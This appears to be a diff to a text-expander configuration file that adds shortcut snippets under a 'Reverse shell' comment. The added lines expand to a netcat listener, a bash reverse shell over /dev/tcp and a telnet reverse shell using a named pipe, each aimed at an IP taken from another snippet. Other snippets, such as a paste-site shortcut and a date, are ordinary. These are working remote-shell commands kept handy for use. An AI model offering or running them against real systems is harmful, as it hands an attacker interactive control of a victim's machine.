@@ -22,6 +22,26 @@ matches:
   - trigger: ":paste"
     replace: "paste.debian.net"
 
+  # Reverse shell
+  - trigger: ":nc"
+    replace: "nc -l -n -vv -p 8080"
+
+  - trigger: ":reverse-bash"
+    replace: "/bin/bash -i > /dev/tcp/{{ip}}/8080 0<&1 2>&1"
+    vars:
+      - name: ip
+        type: match
+        params:
+          trigger: ":vpn"
+
+  - trigger: ":reverse-telnet"
+    replace: "mknod backpipe p && telnet {{ip}} 8080 0<backpipe"
+    vars:
+      - name: ip
+        type: match
+        params:
+          trigger: ":vpn"
+
   # Dates
   - trigger: ":date"
     replace: "{{mydate}}"
